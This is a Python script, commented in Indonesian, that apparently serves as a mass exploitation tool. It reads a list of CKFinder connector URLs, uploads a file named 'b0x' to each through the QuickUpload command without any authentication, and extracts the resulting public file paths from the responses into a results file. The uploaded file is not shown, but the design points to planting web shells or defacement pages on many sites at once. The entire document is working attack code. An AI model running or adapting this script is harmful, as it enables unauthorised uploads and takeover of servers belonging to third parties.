import requests
import re
from urllib.parse import urlparse

# File yang berisi daftar URL CKFinder
file_list = "list.txt"

# File yang akan diupload
file_path = "b0x"

# File untuk menyimpan hasil
results_file = "results.txt"

# Timeout untuk request (dalam detik)
timeout = 10

# Baca daftar URL dari file
with open(file_list, "r") as f:
    urls = f.readlines()

# Buat atau bersihkan file hasil
with open(results_file, "w") as f:
    f.write("")  # Bersihkan isi file

# Looping ke setiap URL
for url in urls:
    url = url.strip()  # Hilangkan newline character
    print("Mengupload file ke:", url)

    # Parameter upload
    params = {
        "command": "QuickUpload",
        "type": "Images"
    }

    # Buat payload untuk upload file
    with open(file_path, "rb") as file:
        payload = {
            "Images": file
        }

        try:
            # Kirim request upload dengan timeout
            response = requests.post(url, params=params, files=payload, timeout=timeout)
            response.raise_for_status()  # Raise exception jika status code tidak 200
        except requests.exceptions.Timeout:
            print("Timeout! Skip...")
            continue
        except requests.exceptions.RequestException as e:
            print("Error:", e)
            continue

        # Cek apakah upload berhasil
        if response.status_code == 200:
            print("File berhasil diupload!")
            # Ekstrak path dari respons HTML
            match = re.search(r"window\.parent\.OnUploadCompleted\(\d+, '([^']+)',", response.text)
            if match:
                uploaded_path = match.group(1)  # Ambil path yang diupload
                # Ambil domain utama dari URL
                parsed_url = urlparse(url)
                domain_utama = f"{parsed_url.scheme}://{parsed_url.netloc}"
                # Gabungkan dengan URL
                result_url = domain_utama + uploaded_path
                print("Hasil URL:", result_url)

                # Simpan hasil ke file
                with open(results_file, "a") as f:
                    f.write(result_url + "\n")
            else:
                print("Path tidak ditemukan dalam respons.")
                # Simpan URL root saja ke file
                parsed_url = urlparse(url)
                domain_utama = f"{parsed_url.scheme}://{parsed_url.netloc}"
                with open(results_file, "a") as f:
                    f.write(domain_utama + "\n")
        else:
            print("Gagal upload file. Status code:", response.status_code)
